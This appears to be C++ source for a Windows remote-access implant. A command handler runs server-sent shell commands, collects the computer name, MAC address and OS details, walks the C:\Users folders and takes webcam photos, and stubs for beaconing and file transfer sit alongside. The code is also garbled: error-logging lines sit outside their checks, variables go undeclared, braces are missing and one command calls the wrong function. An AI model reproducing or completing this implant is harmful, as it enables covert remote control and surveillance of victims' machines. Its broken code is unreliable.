#include <sstream>
#include <string>
#include <windows.h>
#include <iphlpapi.h>
#include <array>
#include <memory>
#include <stdexcept>
#include <iomanip>
#include <vector>
#include <cstdio>
#include <tlhelp32.h>
#include <json/json.h> 

#include "directory_traversal.hpp"
#include "images.hpp"
#include "../Generic/logging.hpp"


#pragma comment(lib, "iphlpapi.lib")


std::string executeShellCommand(const char* cmd) {
    std::array<char, 2048> buffer;
    logger("Executing shell command: " + std::string(cmd));
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
        log_error("_popen() failed!");
        throw std::runtime_error("_popen() failed!");
    if (!pipe) {
        throw std::runtime_error("_popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

    
std::string listProcesses() {
    std::stringstream ss;
    HANDLE hProcessSnap;
        log_error("Unable to create toolhelp snapshot!");
        return "Error: Unable to create toolhelp snapshot!";
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return "Error: Unable to create toolhelp snapshot!";
        log_error("Unable to retrieve process information!");
        return "Error: Unable to retrieve process information!";
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return "Error: Unable to retrieve process information!";
    }
    do {
        ss << "Process name: " << pe32.szExeFile << "\n";
    } while (Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);
    return ss.str();
}

std::string getMacAddress() {
    IP_ADAPTER_INFO AdapterInfo[16];   
    DWORD dwBufLen = sizeof(AdapterInfo);  
        log_error("Error retrieving MAC address");
        return "Error retrieving MAC address";
    DWORD dwStatus = GetAdaptersInfo(   
        AdapterInfo,                      
        &dwBufLen);                      
    if (dwStatus != ERROR_SUCCESS) {
        return "Error retrieving MAC address";
    }

    PIP_ADAPTER_INFO pAdapterInfo = AdapterInfo;
    std::stringstream ss;
    while (pAdapterInfo) {
        for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
            if (i == (pAdapterInfo->AddressLength - 1))
                ss << std::hex << (int)pAdapterInfo->Address[i];
            else
                ss << std::hex << (int)pAdapterInfo->Address[i] << ":";
        }
        pAdapterInfo = pAdapterInfo->Next;
    }
    return ss.str();
}

std::string getSystemInfo() {
    std::stringstream ss;

    SYSTEM_INFO siSysInfo;
    GetSystemInfo(&siSysInfo);

    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi);

    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName) / sizeof(computerName[0]);
    GetComputerNameA(computerName, &size);

    std::string mac_address = getMacAddress();

    ss << "System = Windows\n";
    ss << "Computer Name = " << computerName << "\n";
    ss << "MAC Address = " << mac_address << "\n";
    ss << "Processor Architecture = " << siSysInfo.wProcessorArchitecture << "\n";
    ss << "Number of Processors = " << siSysInfo.dwNumberOfProcessors << "\n";
    ss << "Processor Type = " << siSysInfo.dwProcessorType << "\n";
    ss << "Processor Level = " << siSysInfo.wProcessorLevel << "\n";
    ss << "Processor Revision = " << siSysInfo.wProcessorRevision << "\n";
    ss << "OS Version = " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "." << osvi.dwBuildNumber << "\n";
    ss << "OS Platform ID = " << osvi.dwPlatformId << "\n";
    ss << "OS Service Pack = " << osvi.szCSDVersion << "\n";
    return ss.str();
} 
        log_error("Error opening directory: " + directory);
        return "Error opening directory: " + directory;
std::string listDirectory(const std::string& directory) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return "Error opening directory: " + directory;
    }

    std::stringstream ss;
    ss << std::left << std::setw(30) << "Name" 
       << std::setw(10) << "Size" 
       << std::setw(20) << "Attributes" 
       << std::setw(20) << "Last Modified" << "\n";

    do {
        std::string fileName = findFileData.cFileName;
        if (fileName == "." || fileName == "..") continue; // Skip current and parent directory entries

        DWORD fileSize = findFileData.nFileSizeLow;
        DWORD fileAttributes = findFileData.dwFileAttributes;

        FILETIME ftWrite = findFileData.ftLastWriteTime;
        SYSTEMTIME stUTC, stLocal;
        FileTimeToSystemTime(&ftWrite, &stUTC);
        SystemTimeToTzSpecificLocalTime(NULL, &stUTC, &stLocal);

        char date[20];
        sprintf(date, "%02d/%02d/%d %02d:%02d", 
                stLocal.wMonth, stLocal.wDay, stLocal.wYear, 
                stLocal.wHour, stLocal.wMinute);

        ss << std::left << std::setw(30) << fileName 
           << std::setw(10) << fileSize 
           << std::setw(20) << fileAttributes 
           << std::setw(20) << date << "\n";

    } while (FindNextFile(hFind, &findFileData) != 0);

    FindClose(hFind);
    return ss.str();
}


std::string command_handler(const std::string& command, const std::string& command_data, const std::string& uuid){
    if (command == "shutdown") {
    } else if (command == "switch_beacon") {
    } else if (command == "shell") {
        std::string output = executeShellCommand(command_data.c_str());
        std::cout << "Shell command output: " << output << std::endl;
        logger("Shell command output: " + output);
    } else if (command == "list_processes") {
    } else if (command == "systeminfo") {
        std::string output = getSystemInfo();
        return output;
    } else if (command == "checkfiles") {
    } else if (command == "send_file") {
    } else if (command == "directory_traversal") {
        Json::Value result;
        getDirectoryContents("C:\\Users", result);
        std::string output = result.toStyledString();
        return output;
    } else if (command == "recv_file") {
    } else if (command == "list_services") {
    } else if (command == "disk_usage") {
    } else if (command == "netstat") {
        log_error("Unknown command: " + command);
        std::string output = listDirectory(command_data.c_str());
        return output;
    } else if (command == "snap") {
        CapturePhoto(L"test.jpg");
        return "Picture taken";
    } else {
        std::cerr << "Unknown command: " << command << std::endl;
        log_error("Unknown command: " + command);
    return "not a supported command";
}
